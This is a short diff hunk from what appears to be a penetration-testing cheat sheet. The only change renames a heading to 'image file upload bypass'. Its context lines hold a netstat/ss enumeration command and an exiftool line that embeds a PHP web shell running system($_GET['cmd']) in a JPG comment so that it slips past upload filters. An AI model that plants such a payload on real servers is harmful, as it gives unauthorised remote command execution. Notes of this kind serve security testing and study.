@@ -45,7 +45,7 @@ netstat -punta || ss -nltpu || netstat -anv
 
 Used in ```Magic``` 
 
-File upload bypass
+image file upload bypass
 
 ```
 exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' file.jpg
